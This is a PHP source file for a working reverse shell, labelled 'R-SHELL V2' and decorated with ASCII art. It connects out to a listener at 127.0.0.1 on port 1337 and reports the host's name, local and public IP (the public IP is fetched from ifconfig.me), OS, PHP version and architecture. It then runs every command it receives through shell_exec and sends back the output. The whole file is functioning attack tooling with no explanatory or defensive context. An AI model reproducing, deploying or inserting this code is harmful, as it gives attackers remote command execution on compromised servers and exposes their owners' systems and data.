<?php
function ipv4() {
    return trim(file_get_contents("http://ifconfig.me/ip"));
}

$ascii = "
       _                        
       \`*-.                    
        )  _`-.                 
       .  : `. .                
       : _   '  \               
       ; *` _.   `*-._                 _____        _____ _    _ ______ _      _       __      _____  
       `-.-'          `-.             |  __ \      / ____| |  | |  ____| |    | |      \ \    / /__ \ 
         ;       `       `.           | |__) |____| (___ | |__| | |__  | |    | |       \ \  / /   ) |
         :.       .        \          |  _  /______\___ \|  __  |  __| | |    | |        \ \/ /   / / 
         . \  .   :   .-'   .         | | \ \      ____) | |  | | |____| |____| |____     \  /   / /_ 
         '  `+.;  ;  '      :         |_|  \_\    |_____/|_|  |_|______|______|______|     \/   |____|
         :  '  |    ;       ;-. 
         ; '   : :`-:     _.`* ;
      .*' /  .*' ; .*`- +'  `*' 
      `*-*   `*-*  `*-*'            
";

$sock = fsockopen("127.0.0.1", 1337);
if ($sock) {
    $host = gethostname();
    $lip = gethostbyname($host);
    $pip = ipv4();
    $sys = php_uname();
    $phpv = phpversion();
    $arch = php_uname('m');

    fwrite($sock, "Successfully connected.\n");
    fwrite($sock, $ascii . "\n");
    fwrite($sock, "===== SYSTEM INFORMATION =====\n");
    fwrite($sock, "System: $sys\n");
    fwrite($sock, "Machine: $host\n");
    fwrite($sock, "Local IP: $lip\n");
    fwrite($sock, "Public IP: $pip\n");
    fwrite($sock, "PHP Version: $phpv\n");
    fwrite($sock, "Architecture: $arch\n");
    fwrite($sock, "==============================\n");
    fwrite($sock, "user@r-shell> ");

    while (!feof($sock)) {
        $cmd = trim(fgets($sock));
        if ($cmd === 'exit') break;
        $output = shell_exec($cmd . " 2>&1");
        fwrite($sock, $output);
        fwrite($sock, "\nuser@r-shell> ");
    }
    fclose($sock);
}
?>
